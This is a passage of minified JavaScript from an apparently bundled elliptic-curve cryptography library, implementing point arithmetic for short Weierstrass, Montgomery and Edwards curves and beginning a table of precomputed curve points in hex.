v=!0;for(x=0;x<d;x++)A[x]=g[x][m]|0,A[x]!==0&&(v=!1);if(!v)break;b++,m--}if(m>=0&&b++,y=y.dblp(b),m<0)break;for(x=0;x<d;x++){var _=A[x];_!==0&&(_>0?S=p[x][_-1>>1]:_<0&&(S=p[x][-_-1>>1].neg()),S.type==="affine"?y=y.mixedAdd(S):y=y.add(S))}}for(m=0;m<d;m++)p[m]=null;return h?y:y.toP()};function o(a,c){this.curve=a,this.type=c,this.precomputed=null}return s.BasePoint=o,o.prototype.eq=function(){throw new Error("Not implemented")},o.prototype.validate=function(){return this.curve.validate(this)},s.prototype.decodePoint=function(c,l){c=e.toArray(c,l);var u=this.p.byteLength();if((c[0]===4||c[0]===6||c[0]===7)&&c.length-1===2*u){c[0]===6?n(c[c.length-1]%2===0):c[0]===7&&n(c[c.length-1]%2===1);var d=this.point(c.slice(1,1+u),c.slice(1+u,1+2*u));return d}else if((c[0]===2||c[0]===3)&&c.length-1===u)return this.pointFromX(c.slice(1,1+u),c[0]===3);throw new Error("Unknown point format")},o.prototype.encodeCompressed=function(c){return this.encode(c,!0)},o.prototype._encode=function(c){var l=this.curve.p.byteLength(),u=this.getX().toArray("be",l);return c?[this.getY().isEven()?2:3].concat(u):[4].concat(u,this.getY().toArray("be",l))},o.prototype.encode=function(c,l){return e.encode(this._encode(l),c)},o.prototype.precompute=function(c){if(this.precomputed)return this;var l={doubles:null,naf:null,beta:null};return l.naf=this._getNAFPoints(8),l.doubles=this._getDoubles(4,c),l.beta=this._getBeta(),this.precomputed=l,this},o.prototype._hasDoubles=function(c){if(!this.precomputed)return!1;var l=this.precomputed.doubles;return l?l.points.length>=Math.ceil((c.bitLength()+1)/l.step):!1},o.prototype._getDoubles=function(c,l){if(this.precomputed&&this.precomputed.doubles)return this.precomputed.doubles;for(var u=[this],d=this,h=0;h<l;h+=c){for(var f=0;f<c;f++)d=d.dbl();u.push(d)}return{step:c,points:u}},o.prototype._getNAFPoints=function(c){if(this.precomputed&&this.precomputed.naf)return this.precomputed.naf;for(var l=[this],u=(1<<c)-1,d=u===1?null:this.dbl(),h=1;h<u;h++)l[h]=l[h-1].add(d);return{wnd:c,points:l}},o.prototype._getBeta=function(){return null},o.prototype.dblp=function(c){for(var l=this,u=0;u<c;u++)l=l.dbl();return l},AS}var IS,xU;function Vve(){if(xU)return IS;xU=1;var r=wl(),e=k0(),t=$x(),i=oC(),n=r.assert;function s(c){i.call(this,"short",c),this.a=new e(c.a,16).toRed(this.red),this.b=new e(c.b,16).toRed(this.red),this.tinv=this.two.redInvm(),this.zeroA=this.a.fromRed().cmpn(0)===0,this.threeA=this.a.fromRed().sub(this.p).cmpn(-3)===0,this.endo=this._getEndomorphism(c),this._endoWnafT1=new Array(4),this._endoWnafT2=new Array(4)}t(s,i),IS=s,s.prototype._getEndomorphism=function(l){if(!(!this.zeroA||!this.g||!this.n||this.p.modn(3)!==1)){var u,d;if(l.beta)u=new e(l.beta,16).toRed(this.red);else{var h=this._getEndoRoots(this.p);u=h[0].cmp(h[1])<0?h[0]:h[1],u=u.toRed(this.red)}if(l.lambda)d=new e(l.lambda,16);else{var f=this._getEndoRoots(this.n);this.g.mul(f[0]).x.cmp(this.g.x.redMul(u))===0?d=f[0]:(d=f[1],n(this.g.mul(d).x.cmp(this.g.x.redMul(u))===0))}var p;return l.basis?p=l.basis.map(function(g){return{a:new e(g.a,16),b:new e(g.b,16)}}):p=this._getEndoBasis(d),{beta:u,lambda:d,basis:p}}},s.prototype._getEndoRoots=function(l){var u=l===this.p?this.red:e.mont(l),d=new e(2).toRed(u).redInvm(),h=d.redNeg(),f=new e(3).toRed(u).redNeg().redSqrt().redMul(d),p=h.redAdd(f).fromRed(),g=h.redSub(f).fromRed();return[p,g]},s.prototype._getEndoBasis=function(l){for(var u=this.n.ushrn(Math.floor(this.n.bitLength()/2)),d=l,h=this.n.clone(),f=new e(1),p=new e(0),g=new e(0),w=new e(1),m,x,S,T,k,I,E,C=0,N,L;d.cmpn(0)!==0;){var $=h.div(d);N=h.sub($.mul(d)),L=g.sub($.mul(f));var y=w.sub($.mul(p));if(!S&&N.cmp(u)<0)m=E.neg(),x=f,S=N.neg(),T=L;else if(S&&++C===2)break;E=N,h=d,d=N,g=f,f=L,w=p,p=y}k=N.neg(),I=L;var A=S.sqr().add(T.sqr()),b=k.sqr().add(I.sqr());return b.cmp(A)>=0&&(k=m,I=x),S.negative&&(S=S.neg(),T=T.neg()),k.negative&&(k=k.neg(),I=I.neg()),[{a:S,b:T},{a:k,b:I}]},s.prototype._endoSplit=function(l){var u=this.endo.basis,d=u[0],h=u[1],f=h.b.mul(l).divRound(this.n),p=d.b.neg().mul(l).divRound(this.n),g=f.mul(d.a),w=p.mul(h.a),m=f.mul(d.b),x=p.mul(h.b),S=l.sub(g).sub(w),T=m.add(x).neg();return{k1:S,k2:T}},s.prototype.pointFromX=function(l,u){l=new e(l,16),l.red||(l=l.toRed(this.red));var d=l.redSqr().redMul(l).redIAdd(l.redMul(this.a)).redIAdd(this.b),h=d.redSqrt();if(h.redSqr().redSub(d).cmp(this.zero)!==0)throw new Error("invalid point");var f=h.fromRed().isOdd();return(u&&!f||!u&&f)&&(h=h.redNeg()),this.point(l,h)},s.prototype.validate=function(l){if(l.inf)return!0;var u=l.x,d=l.y,h=this.a.redMul(u),f=u.redSqr().redMul(u).redIAdd(h).redIAdd(this.b);return d.redSqr().redISub(f).cmpn(0)===0},s.prototype._endoWnafMulAdd=function(l,u,d){for(var h=this._endoWnafT1,f=this._endoWnafT2,p=0;p<l.length;p++){var g=this._endoSplit(u[p]),w=l[p],m=w._getBeta();g.k1.negative&&(g.k1.ineg(),w=w.neg(!0)),g.k2.negative&&(g.k2.ineg(),m=m.neg(!0)),h[p*2]=w,h[p*2+1]=m,f[p*2]=g.k1,f[p*2+1]=g.k2}for(var x=this._wnafMulAdd(1,h,f,p*2,d),S=0;S<p*2;S++)h[S]=null,f[S]=null;return x};function o(c,l,u,d){i.BasePoint.call(this,c,"affine"),l===null&&u===null?(this.x=null,this.y=null,this.inf=!0):(this.x=new e(l,16),this.y=new e(u,16),d&&(this.x.forceRed(this.curve.red),this.y.forceRed(this.curve.red)),this.x.red||(this.x=this.x.toRed(this.curve.red)),this.y.red||(this.y=this.y.toRed(this.curve.red)),this.inf=!1)}t(o,i.BasePoint),s.prototype.point=function(l,u,d){return new o(this,l,u,d)},s.prototype.pointFromJSON=function(l,u){return o.fromJSON(this,l,u)},o.prototype._getBeta=function(){if(this.curve.endo){var l=this.precomputed;if(l&&l.beta)return l.beta;var u=this.curve.point(this.x.redMul(this.curve.endo.beta),this.y);if(l){var d=this.curve,h=function(f){return d.point(f.x.redMul(d.endo.beta),f.y)};l.beta=u,u.precomputed={beta:null,naf:l.naf&&{wnd:l.naf.wnd,points:l.naf.points.map(h)},doubles:l.doubles&&{step:l.doubles.step,points:l.doubles.points.map(h)}}}return u}},o.prototype.toJSON=function(){return this.precomputed?[this.x,this.y,this.precomputed&&{doubles:this.precomputed.doubles&&{step:this.precomputed.doubles.step,points:this.precomputed.doubles.points.slice(1)},naf:this.precomputed.naf&&{wnd:this.precomputed.naf.wnd,points:this.precomputed.naf.points.slice(1)}}]:[this.x,this.y]},o.fromJSON=function(l,u,d){typeof u=="string"&&(u=JSON.parse(u));var h=l.point(u[0],u[1],d);if(!u[2])return h;function f(g){return l.point(g[0],g[1],d)}var p=u[2];return h.precomputed={beta:null,doubles:p.doubles&&{step:p.doubles.step,points:[h].concat(p.doubles.points.map(f))},naf:p.naf&&{wnd:p.naf.wnd,points:[h].concat(p.naf.points.map(f))}},h},o.prototype.inspect=function(){return this.isInfinity()?"<EC Point Infinity>":"<EC Point x: "+this.x.fromRed().toString(16,2)+" y: "+this.y.fromRed().toString(16,2)+">"},o.prototype.isInfinity=function(){return this.inf},o.prototype.add=function(l){if(this.inf)return l;if(l.inf)return this;if(this.eq(l))return this.dbl();if(this.neg().eq(l))return this.curve.point(null,null);if(this.x.cmp(l.x)===0)return this.curve.point(null,null);var u=this.y.redSub(l.y);u.cmpn(0)!==0&&(u=u.redMul(this.x.redSub(l.x).redInvm()));var d=u.redSqr().redISub(this.x).redISub(l.x),h=u.redMul(this.x.redSub(d)).redISub(this.y);return this.curve.point(d,h)},o.prototype.dbl=function(){if(this.inf)return this;var l=this.y.redAdd(this.y);if(l.cmpn(0)===0)return this.curve.point(null,null);var u=this.curve.a,d=this.x.redSqr(),h=l.redInvm(),f=d.redAdd(d).redIAdd(d).redIAdd(u).redMul(h),p=f.redSqr().redISub(this.x.redAdd(this.x)),g=f.redMul(this.x.redSub(p)).redISub(this.y);return this.curve.point(p,g)},o.prototype.getX=function(){return this.x.fromRed()},o.prototype.getY=function(){return this.y.fromRed()},o.prototype.mul=function(l){return l=new e(l,16),this.isInfinity()?this:this._hasDoubles(l)?this.curve._fixedNafMul(this,l):this.curve.endo?this.curve._endoWnafMulAdd([this],[l]):this.curve._wnafMul(this,l)},o.prototype.mulAdd=function(l,u,d){var h=[this,u],f=[l,d];return this.curve.endo?this.curve._endoWnafMulAdd(h,f):this.curve._wnafMulAdd(1,h,f,2)},o.prototype.jmulAdd=function(l,u,d){var h=[this,u],f=[l,d];return this.curve.endo?this.curve._endoWnafMulAdd(h,f,!0):this.curve._wnafMulAdd(1,h,f,2,!0)},o.prototype.eq=function(l){return this===l||this.inf===l.inf&&(this.inf||this.x.cmp(l.x)===0&&this.y.cmp(l.y)===0)},o.prototype.neg=function(l){if(this.inf)return this;var u=this.curve.point(this.x,this.y.redNeg());if(l&&this.precomputed){var d=this.precomputed,h=function(f){return f.neg()};u.precomputed={naf:d.naf&&{wnd:d.naf.wnd,points:d.naf.points.map(h)},doubles:d.doubles&&{step:d.doubles.step,points:d.doubles.points.map(h)}}}return u},o.prototype.toJ=function(){if(this.inf)return this.curve.jpoint(null,null,null);var l=this.curve.jpoint(this.x,this.y,this.curve.one);return l};function a(c,l,u,d){i.BasePoint.call(this,c,"jacobian"),l===null&&u===null&&d===null?(this.x=this.curve.one,this.y=this.curve.one,this.z=new e(0)):(this.x=new e(l,16),this.y=new e(u,16),this.z=new e(d,16)),this.x.red||(this.x=this.x.toRed(this.curve.red)),this.y.red||(this.y=this.y.toRed(this.curve.red)),this.z.red||(this.z=this.z.toRed(this.curve.red)),this.zOne=this.z===this.curve.one}return t(a,i.BasePoint),s.prototype.jpoint=function(l,u,d){return new a(this,l,u,d)},a.prototype.toP=function(){if(this.isInfinity())return this.curve.point(null,null);var l=this.z.redInvm(),u=l.redSqr(),d=this.x.redMul(u),h=this.y.redMul(u).redMul(l);return this.curve.point(d,h)},a.prototype.neg=function(){return this.curve.jpoint(this.x,this.y.redNeg(),this.z)},a.prototype.add=function(l){if(this.isInfinity())return l;if(l.isInfinity())return this;var u=l.z.redSqr(),d=this.z.redSqr(),h=this.x.redMul(u),f=l.x.redMul(d),p=this.y.redMul(u.redMul(l.z)),g=l.y.redMul(d.redMul(this.z)),w=h.redSub(f),m=p.redSub(g);if(w.cmpn(0)===0)return m.cmpn(0)!==0?this.curve.jpoint(null,null,null):this.dbl();var x=w.redSqr(),S=x.redMul(w),T=h.redMul(x),k=m.redSqr().redIAdd(S).redISub(T).redISub(T),I=m.redMul(T.redISub(k)).redISub(p.redMul(S)),E=this.z.redMul(l.z).redMul(w);return this.curve.jpoint(k,I,E)},a.prototype.mixedAdd=function(l){if(this.isInfinity())return l.toJ();if(l.isInfinity())return this;var u=this.z.redSqr(),d=this.x,h=l.x.redMul(u),f=this.y,p=l.y.redMul(u).redMul(this.z),g=d.redSub(h),w=f.redSub(p);if(g.cmpn(0)===0)return w.cmpn(0)!==0?this.curve.jpoint(null,null,null):this.dbl();var m=g.redSqr(),x=m.redMul(g),S=d.redMul(m),T=w.redSqr().redIAdd(x).redISub(S).redISub(S),k=w.redMul(S.redISub(T)).redISub(f.redMul(x)),I=this.z.redMul(g);return this.curve.jpoint(T,k,I)},a.prototype.dblp=function(l){if(l===0)return this;if(this.isInfinity())return this;if(!l)return this.dbl();var u;if(this.curve.zeroA||this.curve.threeA){var d=this;for(u=0;u<l;u++)d=d.dbl();return d}var h=this.curve.a,f=this.curve.tinv,p=this.x,g=this.y,w=this.z,m=w.redSqr().redSqr(),x=g.redAdd(g);for(u=0;u<l;u++){var S=p.redSqr(),T=x.redSqr(),k=T.redSqr(),I=S.redAdd(S).redIAdd(S).redIAdd(h.redMul(m)),E=p.redMul(T),C=I.redSqr().redISub(E.redAdd(E)),N=E.redISub(C),L=I.redMul(N);L=L.redIAdd(L).redISub(k);var $=x.redMul(w);u+1<l&&(m=m.redMul(k)),p=C,w=$,x=L}return this.curve.jpoint(p,x.redMul(f),w)},a.prototype.dbl=function(){return this.isInfinity()?this:this.curve.zeroA?this._zeroDbl():this.curve.threeA?this._threeDbl():this._dbl()},a.prototype._zeroDbl=function(){var l,u,d;if(this.zOne){var h=this.x.redSqr(),f=this.y.redSqr(),p=f.redSqr(),g=this.x.redAdd(f).redSqr().redISub(h).redISub(p);g=g.redIAdd(g);var w=h.redAdd(h).redIAdd(h),m=w.redSqr().redISub(g).redISub(g),x=p.redIAdd(p);x=x.redIAdd(x),x=x.redIAdd(x),l=m,u=w.redMul(g.redISub(m)).redISub(x),d=this.y.redAdd(this.y)}else{var S=this.x.redSqr(),T=this.y.redSqr(),k=T.redSqr(),I=this.x.redAdd(T).redSqr().redISub(S).redISub(k);I=I.redIAdd(I);var E=S.redAdd(S).redIAdd(S),C=E.redSqr(),N=k.redIAdd(k);N=N.redIAdd(N),N=N.redIAdd(N),l=C.redISub(I).redISub(I),u=E.redMul(I.redISub(l)).redISub(N),d=this.y.redMul(this.z),d=d.redIAdd(d)}return this.curve.jpoint(l,u,d)},a.prototype._threeDbl=function(){var l,u,d;if(this.zOne){var h=this.x.redSqr(),f=this.y.redSqr(),p=f.redSqr(),g=this.x.redAdd(f).redSqr().redISub(h).redISub(p);g=g.redIAdd(g);var w=h.redAdd(h).redIAdd(h).redIAdd(this.curve.a),m=w.redSqr().redISub(g).redISub(g);l=m;var x=p.redIAdd(p);x=x.redIAdd(x),x=x.redIAdd(x),u=w.redMul(g.redISub(m)).redISub(x),d=this.y.redAdd(this.y)}else{var S=this.z.redSqr(),T=this.y.redSqr(),k=this.x.redMul(T),I=this.x.redSub(S).redMul(this.x.redAdd(S));I=I.redAdd(I).redIAdd(I);var E=k.redIAdd(k);E=E.redIAdd(E);var C=E.redAdd(E);l=I.redSqr().redISub(C),d=this.y.redAdd(this.z).redSqr().redISub(T).redISub(S);var N=T.redSqr();N=N.redIAdd(N),N=N.redIAdd(N),N=N.redIAdd(N),u=I.redMul(E.redISub(l)).redISub(N)}return this.curve.jpoint(l,u,d)},a.prototype._dbl=function(){var l=this.curve.a,u=this.x,d=this.y,h=this.z,f=h.redSqr().redSqr(),p=u.redSqr(),g=d.redSqr(),w=p.redAdd(p).redIAdd(p).redIAdd(l.redMul(f)),m=u.redAdd(u);m=m.redIAdd(m);var x=m.redMul(g),S=w.redSqr().redISub(x.redAdd(x)),T=x.redISub(S),k=g.redSqr();k=k.redIAdd(k),k=k.redIAdd(k),k=k.redIAdd(k);var I=w.redMul(T).redISub(k),E=d.redAdd(d).redMul(h);return this.curve.jpoint(S,I,E)},a.prototype.trpl=function(){if(!this.curve.zeroA)return this.dbl().add(this);var l=this.x.redSqr(),u=this.y.redSqr(),d=this.z.redSqr(),h=u.redSqr(),f=l.redAdd(l).redIAdd(l),p=f.redSqr(),g=this.x.redAdd(u).redSqr().redISub(l).redISub(h);g=g.redIAdd(g),g=g.redAdd(g).redIAdd(g),g=g.redISub(p);var w=g.redSqr(),m=h.redIAdd(h);m=m.redIAdd(m),m=m.redIAdd(m),m=m.redIAdd(m);var x=f.redIAdd(g).redSqr().redISub(p).redISub(w).redISub(m),S=u.redMul(x);S=S.redIAdd(S),S=S.redIAdd(S);var T=this.x.redMul(w).redISub(S);T=T.redIAdd(T),T=T.redIAdd(T);var k=this.y.redMul(x.redMul(m.redISub(x)).redISub(g.redMul(w)));k=k.redIAdd(k),k=k.redIAdd(k),k=k.redIAdd(k);var I=this.z.redAdd(g).redSqr().redISub(d).redISub(w);return this.curve.jpoint(T,k,I)},a.prototype.mul=function(l,u){return l=new e(l,u),this.curve._wnafMul(this,l)},a.prototype.eq=function(l){if(l.type==="affine")return this.eq(l.toJ());if(this===l)return!0;var u=this.z.redSqr(),d=l.z.redSqr();if(this.x.redMul(d).redISub(l.x.redMul(u)).cmpn(0)!==0)return!1;var h=u.redMul(this.z),f=d.redMul(l.z);return this.y.redMul(f).redISub(l.y.redMul(h)).cmpn(0)===0},a.prototype.eqXToP=function(l){var u=this.z.redSqr(),d=l.toRed(this.curve.red).redMul(u);if(this.x.cmp(d)===0)return!0;for(var h=l.clone(),f=this.curve.redN.redMul(u);;){if(h.iadd(this.curve.n),h.cmp(this.curve.p)>=0)return!1;if(d.redIAdd(f),this.x.cmp(d)===0)return!0}},a.prototype.inspect=function(){return this.isInfinity()?"<EC JPoint Infinity>":"<EC JPoint x: "+this.x.toString(16,2)+" y: "+this.y.toString(16,2)+" z: "+this.z.toString(16,2)+">"},a.prototype.isInfinity=function(){return this.z.cmpn(0)===0},IS}var TS,CU;function Kve(){if(CU)return TS;CU=1;var r=k0(),e=$x(),t=oC(),i=wl();function n(o){t.call(this,"mont",o),this.a=new r(o.a,16).toRed(this.red),this.b=new r(o.b,16).toRed(this.red),this.i4=new r(4).toRed(this.red).redInvm(),this.two=new r(2).toRed(this.red),this.a24=this.i4.redMul(this.a.redAdd(this.two))}e(n,t),TS=n,n.prototype.validate=function(a){var c=a.normalize().x,l=c.redSqr(),u=l.redMul(c).redAdd(l.redMul(this.a)).redAdd(c),d=u.redSqrt();return d.redSqr().cmp(u)===0};function s(o,a,c){t.BasePoint.call(this,o,"projective"),a===null&&c===null?(this.x=this.curve.one,this.z=this.curve.zero):(this.x=new r(a,16),this.z=new r(c,16),this.x.red||(this.x=this.x.toRed(this.curve.red)),this.z.red||(this.z=this.z.toRed(this.curve.red)))}return e(s,t.BasePoint),n.prototype.decodePoint=function(a,c){return this.point(i.toArray(a,c),1)},n.prototype.point=function(a,c){return new s(this,a,c)},n.prototype.pointFromJSON=function(a){return s.fromJSON(this,a)},s.prototype.precompute=function(){},s.prototype._encode=function(){return this.getX().toArray("be",this.curve.p.byteLength())},s.fromJSON=function(a,c){return new s(a,c[0],c[1]||a.one)},s.prototype.inspect=function(){return this.isInfinity()?"<EC Point Infinity>":"<EC Point x: "+this.x.fromRed().toString(16,2)+" z: "+this.z.fromRed().toString(16,2)+">"},s.prototype.isInfinity=function(){return this.z.cmpn(0)===0},s.prototype.dbl=function(){var a=this.x.redAdd(this.z),c=a.redSqr(),l=this.x.redSub(this.z),u=l.redSqr(),d=c.redSub(u),h=c.redMul(u),f=d.redMul(u.redAdd(this.curve.a24.redMul(d)));return this.curve.point(h,f)},s.prototype.add=function(){throw new Error("Not supported on Montgomery curve")},s.prototype.diffAdd=function(a,c){var l=this.x.redAdd(this.z),u=this.x.redSub(this.z),d=a.x.redAdd(a.z),h=a.x.redSub(a.z),f=h.redMul(l),p=d.redMul(u),g=c.z.redMul(f.redAdd(p).redSqr()),w=c.x.redMul(f.redISub(p).redSqr());return this.curve.point(g,w)},s.prototype.mul=function(a){for(var c=a.clone(),l=this,u=this.curve.point(null,null),d=this,h=[];c.cmpn(0)!==0;c.iushrn(1))h.push(c.andln(1));for(var f=h.length-1;f>=0;f--)h[f]===0?(l=l.diffAdd(u,d),u=u.dbl()):(u=l.diffAdd(u,d),l=l.dbl());return u},s.prototype.mulAdd=function(){throw new Error("Not supported on Montgomery curve")},s.prototype.jumlAdd=function(){throw new Error("Not supported on Montgomery curve")},s.prototype.eq=function(a){return this.getX().cmp(a.getX())===0},s.prototype.normalize=function(){return this.x=this.x.redMul(this.z.redInvm()),this.z=this.curve.one,this},s.prototype.getX=function(){return this.normalize(),this.x.fromRed()},TS}var kS,EU;function Gve(){if(EU)return kS;EU=1;var r=wl(),e=k0(),t=$x(),i=oC(),n=r.assert;function s(a){this.twisted=(a.a|0)!==1,this.mOneA=this.twisted&&(a.a|0)===-1,this.extended=this.mOneA,i.call(this,"edwards",a),this.a=new e(a.a,16).umod(this.red.m),this.a=this.a.toRed(this.red),this.c=new e(a.c,16).toRed(this.red),this.c2=this.c.redSqr(),this.d=new e(a.d,16).toRed(this.red),this.dd=this.d.redAdd(this.d),n(!this.twisted||this.c.fromRed().cmpn(1)===0),this.oneC=(a.c|0)===1}t(s,i),kS=s,s.prototype._mulA=function(c){return this.mOneA?c.redNeg():this.a.redMul(c)},s.prototype._mulC=function(c){return this.oneC?c:this.c.redMul(c)},s.prototype.jpoint=function(c,l,u,d){return this.point(c,l,u,d)},s.prototype.pointFromX=function(c,l){c=new e(c,16),c.red||(c=c.toRed(this.red));var u=c.redSqr(),d=this.c2.redSub(this.a.redMul(u)),h=this.one.redSub(this.c2.redMul(this.d).redMul(u)),f=d.redMul(h.redInvm()),p=f.redSqrt();if(p.redSqr().redSub(f).cmp(this.zero)!==0)throw new Error("invalid point");var g=p.fromRed().isOdd();return(l&&!g||!l&&g)&&(p=p.redNeg()),this.point(c,p)},s.prototype.pointFromY=function(c,l){c=new e(c,16),c.red||(c=c.toRed(this.red));var u=c.redSqr(),d=u.redSub(this.c2),h=u.redMul(this.d).redMul(this.c2).redSub(this.a),f=d.redMul(h.redInvm());if(f.cmp(this.zero)===0){if(l)throw new Error("invalid point");return this.point(this.zero,c)}var p=f.redSqrt();if(p.redSqr().redSub(f).cmp(this.zero)!==0)throw new Error("invalid point");return p.fromRed().isOdd()!==l&&(p=p.redNeg()),this.point(p,c)},s.prototype.validate=function(c){if(c.isInfinity())return!0;c.normalize();var l=c.x.redSqr(),u=c.y.redSqr(),d=l.redMul(this.a).redAdd(u),h=this.c2.redMul(this.one.redAdd(this.d.redMul(l).redMul(u)));return d.cmp(h)===0};function o(a,c,l,u,d){i.BasePoint.call(this,a,"projective"),c===null&&l===null&&u===null?(this.x=this.curve.zero,this.y=this.curve.one,this.z=this.curve.one,this.t=this.curve.zero,this.zOne=!0):(this.x=new e(c,16),this.y=new e(l,16),this.z=u?new e(u,16):this.curve.one,this.t=d&&new e(d,16),this.x.red||(this.x=this.x.toRed(this.curve.red)),this.y.red||(this.y=this.y.toRed(this.curve.red)),this.z.red||(this.z=this.z.toRed(this.curve.red)),this.t&&!this.t.red&&(this.t=this.t.toRed(this.curve.red)),this.zOne=this.z===this.curve.one,this.curve.extended&&!this.t&&(this.t=this.x.redMul(this.y),this.zOne||(this.t=this.t.redMul(this.z.redInvm()))))}return t(o,i.BasePoint),s.prototype.pointFromJSON=function(c){return o.fromJSON(this,c)},s.prototype.point=function(c,l,u,d){return new o(this,c,l,u,d)},o.fromJSON=function(c,l){return new o(c,l[0],l[1],l[2])},o.prototype.inspect=function(){return this.isInfinity()?"<EC Point Infinity>":"<EC Point x: "+this.x.fromRed().toString(16,2)+" y: "+this.y.fromRed().toString(16,2)+" z: "+this.z.fromRed().toString(16,2)+">"},o.prototype.isInfinity=function(){return this.x.cmpn(0)===0&&(this.y.cmp(this.z)===0||this.zOne&&this.y.cmp(this.curve.c)===0)},o.prototype._extDbl=function(){var c=this.x.redSqr(),l=this.y.redSqr(),u=this.z.redSqr();u=u.redIAdd(u);var d=this.curve._mulA(c),h=this.x.redAdd(this.y).redSqr().redISub(c).redISub(l),f=d.redAdd(l),p=f.redSub(u),g=d.redSub(l),w=h.redMul(p),m=f.redMul(g),x=h.redMul(g),S=p.redMul(f);return this.curve.point(w,m,S,x)},o.prototype._projDbl=function(){var c=this.x.redAdd(this.y).redSqr(),l=this.x.redSqr(),u=this.y.redSqr(),d,h,f,p,g,w;if(this.curve.twisted){p=this.curve._mulA(l);var m=p.redAdd(u);this.zOne?(d=c.redSub(l).redSub(u).redMul(m.redSub(this.curve.two)),h=m.redMul(p.redSub(u)),f=m.redSqr().redSub(m).redSub(m)):(g=this.z.redSqr(),w=m.redSub(g).redISub(g),d=c.redSub(l).redISub(u).redMul(w),h=m.redMul(p.redSub(u)),f=m.redMul(w))}else p=l.redAdd(u),g=this.curve._mulC(this.z).redSqr(),w=p.redSub(g).redSub(g),d=this.curve._mulC(c.redISub(p)).redMul(w),h=this.curve._mulC(p).redMul(l.redISub(u)),f=p.redMul(w);return this.curve.point(d,h,f)},o.prototype.dbl=function(){return this.isInfinity()?this:this.curve.extended?this._extDbl():this._projDbl()},o.prototype._extAdd=function(c){var l=this.y.redSub(this.x).redMul(c.y.redSub(c.x)),u=this.y.redAdd(this.x).redMul(c.y.redAdd(c.x)),d=this.t.redMul(this.curve.dd).redMul(c.t),h=this.z.redMul(c.z.redAdd(c.z)),f=u.redSub(l),p=h.redSub(d),g=h.redAdd(d),w=u.redAdd(l),m=f.redMul(p),x=g.redMul(w),S=f.redMul(w),T=p.redMul(g);return this.curve.point(m,x,T,S)},o.prototype._projAdd=function(c){var l=this.z.redMul(c.z),u=l.redSqr(),d=this.x.redMul(c.x),h=this.y.redMul(c.y),f=this.curve.d.redMul(d).redMul(h),p=u.redSub(f),g=u.redAdd(f),w=this.x.redAdd(this.y).redMul(c.x.redAdd(c.y)).redISub(d).redISub(h),m=l.redMul(p).redMul(w),x,S;return this.curve.twisted?(x=l.redMul(g).redMul(h.redSub(this.curve._mulA(d))),S=p.redMul(g)):(x=l.redMul(g).redMul(h.redSub(d)),S=this.curve._mulC(p).redMul(g)),this.curve.point(m,x,S)},o.prototype.add=function(c){return this.isInfinity()?c:c.isInfinity()?this:this.curve.extended?this._extAdd(c):this._projAdd(c)},o.prototype.mul=function(c){return this._hasDoubles(c)?this.curve._fixedNafMul(this,c):this.curve._wnafMul(this,c)},o.prototype.mulAdd=function(c,l,u){return this.curve._wnafMulAdd(1,[this,l],[c,u],2,!1)},o.prototype.jmulAdd=function(c,l,u){return this.curve._wnafMulAdd(1,[this,l],[c,u],2,!0)},o.prototype.normalize=function(){if(this.zOne)return this;var c=this.z.redInvm();return this.x=this.x.redMul(c),this.y=this.y.redMul(c),this.t&&(this.t=this.t.redMul(c)),this.z=this.curve.one,this.zOne=!0,this},o.prototype.neg=function(){return this.curve.point(this.x.redNeg(),this.y,this.z,this.t&&this.t.redNeg())},o.prototype.getX=function(){return this.normalize(),this.x.fromRed()},o.prototype.getY=function(){return this.normalize(),this.y.fromRed()},o.prototype.eq=function(c){return this===c||this.getX().cmp(c.getX())===0&&this.getY().cmp(c.getY())===0},o.prototype.eqXToP=function(c){var l=c.toRed(this.curve.red).redMul(this.z);if(this.x.cmp(l)===0)return!0;for(var u=c.clone(),d=this.curve.redN.redMul(this.z);;){if(u.iadd(this.curve.n),u.cmp(this.curve.p)>=0)return!1;if(l.redIAdd(d),this.x.cmp(l)===0)return!0}},o.prototype.toP=o.prototype.normalize,o.prototype.mixedAdd=o.prototype.add,kS}var _U;function SQ(){return _U||(_U=1,function(r){var e=r;e.base=oC(),e.short=Vve(),e.mont=Kve(),e.edwards=Gve()}(SS)),SS}var NS={},PS,SU;function Zve(){return SU||(SU=1,PS={doubles:{step:4,points:[["e60fce93b59e9ec53011aabc21c23e97b2a31369b87a5ae9c44ee89e2a6dec0a","f7e3507399e595929db99f34f57937101296891e44d23f0be1f32cce69616821"],["8282263212c609d9ea2a6e3e172de238d8c39cabd5ac1ca10646e23fd5f51508","11f8a8098557dfe45e8256e830b60ace62d613ac2f7b17bed31b6eaff6e26caf"],["175e159f728b865a72f99cc6c6fc846de0b93833fd2222ed73fce5b551e5b739","d3506e0d9e3c79eba4ef97a51ff71f5eacb5955add24345c6efa6ffee9fed695"],["363d90d447b00c9c99ceac05b6262ee053441c7e55552ffe526bad8f83ff4640","4e273adfc732221953b445397f3363145b9a89008199ecb62003c7f3bee9de9"],["8b4b5f165df3c2be8c6244b5b745638843e4a781a15bcd1b69f79a55dffdf80c","4aad0a6f68d308b4b3fbd7813ab0da04f9e336546162ee56b3eff0c65fd4fd36"],["723cbaa6e5db996d6bf771c00bd548c7b700dbffa6c0e77bcb6115925232fcda","96e867b5595cc498a921137488824d6e2660a0653779494801dc069d9eb39f5f"],["eebfa4d493bebf98ba5feec812c2d3b50947961237a919839a533eca0e7dd7fa","5d9a8ca3970ef0f269ee7edaf178089d9ae4cdc3a711f712ddfd4fdae1de8999"],["100f44da696e71672791d0a09b7bde459f1215a29b3c03bfefd7835b39a48db0","cdd9e13192a00b772ec8f3300c090666b7ff4a18ff5195ac0fbd5cd62bc65a09"],["e1031be262c7ed1b1dc9227a4a04c017a77f8d4464f3b3852c8acde6e534fd2d","9d7061928940405e6bb6a4176597535af292dd419e1ced79a44f18f29456a00d"],["feea6cae46d55b530ac2839f143bd7ec5cf8b266a41d6af52d5e688d9094696d","e57c6b6c97dce1bab06e4e12bf3ecd5c981c8957cc41442d3155debf18090088"],["da67a91d91049cdcb367be4be6ffca3cfeed657d808583de33fa978bc1ec6cb1","9bacaa35481642bc41f463f7ec9780e5dec7adc508f740a17e9ea8e27a68be1d"],["53904faa0b334cdda6e000935ef22151ec08d0f7bb11069f57545ccc1a37b7c0","5bc087d0bc80106d88c9eccac20d3c1c13999981e14434699dcb096b022771c8"],["8e7bcd0bd35983a7719cca7764ca906779b53a043a9b8bcaeff959f43ad86047","10b7770b2a3da4b3940310420ca9514579e88e2e47fd68b3ea10047e8460372a"],["385eed34c1cdff21e6d0818689b81bde71a7f4f18397e6690a841e1599c43862","283bebc3e8ea23f56701de19e9ebf4576b304eec2086dc8cc0458fe5542e5453"],["6f9d9b803ecf191637c73a4413dfa180fddf84a5947fbc9c606ed86c3fac3a7","7c80c68e603059ba69b8e2a30e